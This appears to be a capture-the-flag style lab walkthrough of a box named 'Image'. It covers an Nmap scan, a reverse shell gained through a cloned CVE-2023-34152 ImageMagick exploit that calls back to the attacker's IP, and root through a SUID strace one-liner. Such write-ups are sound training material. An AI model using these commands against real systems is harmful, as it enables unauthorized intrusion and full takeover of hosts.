---
icon: ubuntu
---

# Image - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.139.178 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-28 09:44 EDT
Nmap scan report for 192.168.139.178
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: ImageMagick Identifier
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   33.32 ms 192.168.45.1
2   33.22 ms 192.168.45.254
3   33.35 ms 192.168.251.1
4   33.55 ms 192.168.139.178
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1215).png" alt=""><figcaption></figcaption></figure>

Uploading a random png file reveals a version for ImageMagick

<figure><img src="../../.gitbook/assets/image (1216).png" alt=""><figcaption></figcaption></figure>

I am going to search for an exploit&#x20;

### <mark style="color:$primary;">ImageMagick 6.9-6.4 RCE</mark>

<figure><img src="../../.gitbook/assets/image (1217).png" alt=""><figcaption></figcaption></figure>

I found an RCE for this exact version! I am going to clone it and take a look at it.

```
git clone https://github.com/SudoIndividual/CVE-2023-34152.git
```

The exploit creates a file for us to upload that grants us a reverse shell on the target machine

```
python3 CVE-2023-34152.py 192.168.45.158 80
```

<figure><img src="../../.gitbook/assets/image (1218).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1219).png" alt=""><figcaption></figcaption></figure>

I am going to setup a listener on port 80 and upload the file

<figure><img src="../../.gitbook/assets/image (1220).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1221).png" alt=""><figcaption></figcaption></figure>

We got a shell as www-data!

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Linpeas</mark>&#x20;

linpeas discovers the strace SUID

<figure><img src="../../.gitbook/assets/image (1222).png" alt=""><figcaption></figcaption></figure>

[**Gtfobins**](https://gtfobins.github.io/gtfobins/strace/) reveals an easy priv esc

<figure><img src="../../.gitbook/assets/image (1223).png" alt=""><figcaption></figcaption></figure>

Runing the below command will elevate us to the root user!

```
/usr/bin/strace -o /dev/null /bin/bash -p
```

<figure><img src="../../.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

We are root! :evergreen\_tree:
